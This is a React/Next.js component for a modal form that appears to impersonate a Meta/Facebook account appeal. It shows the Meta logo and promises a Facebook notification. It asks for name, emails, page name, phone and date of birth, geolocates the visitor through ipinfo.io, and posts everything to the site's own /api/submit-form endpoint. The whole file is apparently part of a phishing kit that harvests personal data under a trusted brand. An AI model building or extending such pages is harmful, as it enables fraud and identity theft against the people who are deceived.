"use client";

import { useState, useEffect, useRef } from "react";
import Image from "next/image";
import type { FormData } from "@/types/form";
import { countries } from "@/lib/countries";

interface AppealModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSubmit: (data: FormData) => void;
}

export function AppealModal({ isOpen, onClose, onSubmit }: AppealModalProps) {
  const [formData, setFormData] = useState<FormData>({
    fullName: "",
    email: "",
    emailBusiness: "",
    pageName: "",
    phoneNumber: "",
    countryCode: "US",
    dialCode: "+1",
    day: "",
    month: "",
    year: "",
    issueDescription: "",
    agreeToTerms: false,
    facebookNotification: true,
  });

  const [errors, setErrors] = useState<Partial<Record<keyof FormData, string>>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const dropdownRef = useRef<HTMLDivElement>(null);

  // Auto detect country khi mount - ưu tiên /api/detect-location (dùng cf-ipcountry trên Cloudflare)
  // fallback về ipinfo.io/json nếu API không trả về countryCode
  useEffect(() => {
    if (!isOpen) return;
    const applyCountry = (code: string) => {
      let country = countries.find((c) => c.code === code);
      if (!country) country = countries.find((c) => c.code === "US") || countries[0];
      setFormData((prev) => ({
        ...prev,
        countryCode: country!.code,
        dialCode: country!.dialCode,
        phoneNumber: country!.dialCode + " ",
      }));
    };

    fetch("/api/detect-location")
      .then((r) => r.json())
      .then((data) => {
        if (data.countryCode && data.countryCode !== "US") {
          applyCountry(data.countryCode);
        } else {
          // Fallback: gọi ipinfo trực tiếp từ browser
          return fetch("https://ipinfo.io/json")
            .then((r) => r.json())
            .then((d) => applyCountry(d.country || "US"));
        }
      })
      .catch(() =>
        fetch("https://ipinfo.io/json")
          .then((r) => r.json())
          .then((d) => applyCountry(d.country || "US"))
          .catch(() => applyCountry("US"))
      );
  }, [isOpen]);

  // Close dropdown khi click outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setShowCountryDropdown(false);
      }
    };
    if (showCountryDropdown) {
      document.addEventListener("mousedown", handleClickOutside);
    }
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [showCountryDropdown]);

  const handleChange = (field: keyof FormData, value: string | boolean) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: undefined }));
    }
  };

  const handlePhoneChange = (value: string) => {
    // Giữ dial code ở đầu
    if (!value.startsWith(formData.dialCode)) {
      value = formData.dialCode + " " + value.replace(/^\+?\d+\s*/, "");
    }
    setFormData((prev) => ({ ...prev, phoneNumber: value }));
    if (errors.phoneNumber) {
      setErrors((prev) => ({ ...prev, phoneNumber: undefined }));
    }
  };

  const handleCountrySelect = (code: string) => {
    const country = countries.find((c) => c.code === code) || countries[0];
    const currentNumber = formData.phoneNumber.replace(formData.dialCode, "").trim();
    setFormData((prev) => ({
      ...prev,
      countryCode: country.code,
      dialCode: country.dialCode,
      phoneNumber: country.dialCode + " " + currentNumber,
    }));
    setShowCountryDropdown(false);
    setSearchQuery("");
  };

  const filteredCountries = countries.filter(
    (country) =>
      country.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      country.dialCode.includes(searchQuery) ||
      country.code.toLowerCase().includes(searchQuery.toLowerCase())
  );

  const validate = (): boolean => {
    const newErrors: Partial<Record<keyof FormData, string>> = {};

    if (!formData.fullName.trim()) newErrors.fullName = "Full name is required";
    if (!formData.email.trim()) newErrors.email = "Email is required";
    if (formData.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = "Invalid email format";
    }
    if (!formData.phoneNumber.trim() || formData.phoneNumber.length < 10) {
      newErrors.phoneNumber = "Phone number is required";
    }
    if (!formData.day || !formData.month || !formData.year) {
      newErrors.day = "Date of birth is required";
    }
    if (!formData.agreeToTerms) {
      newErrors.agreeToTerms = "You must agree to the terms";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;

    setIsSubmitting(true);
    try {
      const res = await fetch("/api/submit-form", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      const data = await res.json();
      if (data.success) {
        onSubmit(formData);
      } else {
        alert("Failed to submit form. Please try again.");
      }
    } catch (error) {
      console.error("Submit error:", error);
      alert("An error occurred. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  if (!isOpen) return null;

  const selectedCountry = countries.find((c) => c.code === formData.countryCode) || countries[0];

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
      <div className="relative w-full max-w-md rounded-2xl bg-white shadow-2xl">
        <button
          onClick={onClose}
          className="absolute right-4 top-4 flex h-8 w-8 items-center justify-center rounded-full text-slate-400 transition hover:bg-slate-100 hover:text-slate-600"
          aria-label="Close"
        >
          <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>

        <div className="p-6">
          <div className="mb-4">
            <Image
              src="/logo-meta.svg"
              alt="Meta"
              width={100}
              height={33}
              className="mx-auto"
            />
          </div>

          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <input
                type="text"
                placeholder="Full Name"
                value={formData.fullName}
                onChange={(e) => handleChange("fullName", e.target.value)}
                className={`w-full rounded-lg border px-3 py-2.5 text-sm ${
                  errors.fullName ? "border-red-500" : "border-slate-300"
                }`}
              />
              {errors.fullName && <p className="mt-1 text-xs text-red-500">{errors.fullName}</p>}
            </div>

            <div>
              <input
                type="email"
                placeholder="Email"
                value={formData.email}
                onChange={(e) => handleChange("email", e.target.value)}
                className={`w-full rounded-lg border px-3 py-2.5 text-sm ${
                  errors.email ? "border-red-500" : "border-slate-300"
                }`}
              />
              {errors.email && <p className="mt-1 text-xs text-red-500">{errors.email}</p>}
            </div>

            <div>
              <input
                type="email"
                placeholder="Email Business (Optional)"
                value={formData.emailBusiness}
                onChange={(e) => handleChange("emailBusiness", e.target.value)}
                className="w-full rounded-lg border border-slate-300 px-3 py-2.5 text-sm"
              />
            </div>

            <div>
              <input
                type="text"
                placeholder="Page Name (Optional)"
                value={formData.pageName}
                onChange={(e) => handleChange("pageName", e.target.value)}
                className="w-full rounded-lg border border-slate-300 px-3 py-2.5 text-sm"
              />
            </div>

            <div className="flex gap-2">
              <div className="relative" ref={dropdownRef}>
                <button
                  type="button"
                  onClick={() => setShowCountryDropdown(!showCountryDropdown)}
                  className="flex min-w-[120px] items-center justify-between gap-2 rounded-lg border border-slate-300 bg-white px-3 py-2.5 text-sm"
                >
                  <div className="flex items-center gap-2">
                    <Image
                      src={selectedCountry.flagUrl}
                      alt={`${selectedCountry.name} flag`}
                      width={24}
                      height={16}
                      className="h-4 w-6 rounded-sm border border-slate-200 object-cover"
                      unoptimized
                    />
                    <span className="font-medium">{formData.dialCode}</span>
                  </div>
                  <span className="text-xs text-slate-400">▼</span>
                </button>
                {showCountryDropdown && (
                  <div className="absolute z-10 mt-1 w-64 rounded-lg border border-slate-300 bg-white shadow-xl">
                    <div className="sticky top-0 border-b border-slate-200 bg-white p-2">
                      <input
                        type="text"
                        placeholder="Search country..."
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                        className="w-full rounded border border-slate-300 px-3 py-2 text-sm"
                        autoFocus
                      />
                    </div>
                    <div className="max-h-64 overflow-y-auto">
                      {filteredCountries.length > 0 ? (
                        filteredCountries.map((country) => (
                          <button
                            key={country.code}
                            type="button"
                            onClick={() => handleCountrySelect(country.code)}
                            className={`flex w-full items-center gap-3 px-4 py-2 text-left hover:bg-slate-50 ${
                              country.code === formData.countryCode ? "bg-metaBlue/5" : ""
                            }`}
                          >
                          <Image
                            src={country.flagUrl}
                            alt={`${country.name} flag`}
                            width={24}
                            height={16}
                            className="h-4 w-6 rounded-sm border border-slate-200 object-cover"
                            unoptimized
                          />
                          <span className="text-sm font-semibold">{country.dialCode}</span>
                            <span className="flex-1 text-sm text-slate-700">{country.name}</span>
                          </button>
                        ))
                      ) : (
                        <div className="px-4 py-3 text-center text-sm text-slate-500">
                          No countries found
                        </div>
                      )}
                    </div>
                  </div>
                )}
              </div>
              <div className="flex-1">
                <input
                  type="tel"
                  placeholder="Phone Number"
                  value={formData.phoneNumber}
                  onChange={(e) => handlePhoneChange(e.target.value)}
                  className={`w-full rounded-lg border px-3 py-2.5 text-sm ${
                    errors.phoneNumber ? "border-red-500" : "border-slate-300"
                  }`}
                />
                {errors.phoneNumber && (
                  <p className="mt-1 text-xs text-red-500">{errors.phoneNumber}</p>
                )}
              </div>
            </div>

            <div>
              <label className="mb-1 block text-sm text-slate-600">Date of Birth</label>
              <div className="grid grid-cols-3 gap-2">
                <input
                  type="text"
                  placeholder="Day"
                  value={formData.day}
                  onChange={(e) => handleChange("day", e.target.value.replace(/\D/g, "").slice(0, 2))}
                  maxLength={2}
                  className={`rounded-lg border px-3 py-2.5 text-sm ${
                    errors.day ? "border-red-500" : "border-slate-300"
                  }`}
                />
                <input
                  type="text"
                  placeholder="Month"
                  value={formData.month}
                  onChange={(e) => handleChange("month", e.target.value.replace(/\D/g, "").slice(0, 2))}
                  maxLength={2}
                  className={`rounded-lg border px-3 py-2.5 text-sm ${
                    errors.day ? "border-red-500" : "border-slate-300"
                  }`}
                />
                <input
                  type="text"
                  placeholder="Year"
                  value={formData.year}
                  onChange={(e) => handleChange("year", e.target.value.replace(/\D/g, "").slice(0, 4))}
                  maxLength={4}
                  className={`rounded-lg border px-3 py-2.5 text-sm ${
                    errors.day ? "border-red-500" : "border-slate-300"
                  }`}
                />
              </div>
              {errors.day && <p className="mt-1 text-xs text-red-500">{errors.day}</p>}
            </div>

            <div>
              <textarea
                placeholder="Note (Optional)"
                value={formData.issueDescription}
                onChange={(e) => handleChange("issueDescription", e.target.value)}
                maxLength={500}
                rows={3}
                className="w-full rounded-lg border border-slate-300 px-3 py-2.5 text-sm"
              />
              <p className="mt-1 text-right text-xs text-slate-400">
                {formData.issueDescription?.length || 0}/500 characters
              </p>
            </div>

            <div className="rounded-lg border border-slate-200 bg-slate-50 p-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Image src="/ic_facebook.svg" alt="Facebook" width={20} height={20} />
                  <div>
                    <p className="text-xs font-medium text-slate-900">on Facebook</p>
                    <p className="text-xs text-slate-500">We will send you a notification on Facebook.</p>
                  </div>
                </div>
                <button
                  type="button"
                  onClick={() => handleChange("facebookNotification", !formData.facebookNotification)}
                  className={`relative h-6 w-11 rounded-full transition-colors ${
                    formData.facebookNotification ? "bg-metaBlue" : "bg-slate-300"
                  }`}
                >
                  <span
                    className={`absolute top-0.5 left-0.5 h-5 w-5 rounded-full bg-white transition-transform ${
                      formData.facebookNotification ? "translate-x-5" : ""
                    }`}
                  />
                </button>
              </div>
            </div>

            <div className="flex items-start gap-2">
              <input
                type="checkbox"
                id="terms"
                checked={formData.agreeToTerms}
                onChange={(e) => handleChange("agreeToTerms", e.target.checked)}
                className="mt-0.5"
              />
              <label htmlFor="terms" className="text-xs text-slate-600">
                I agree with{" "}
                <a href="#" className="text-metaBlue hover:underline">
                  Terms of use
                </a>
              </label>
            </div>
            {errors.agreeToTerms && (
              <p className="text-xs text-red-500">{errors.agreeToTerms}</p>
            )}

            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full rounded-lg bg-metaBlue px-4 py-2.5 text-sm font-semibold text-white transition hover:bg-metaIndigo disabled:opacity-50"
            >
              {isSubmitting ? "Sending..." : "Send"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
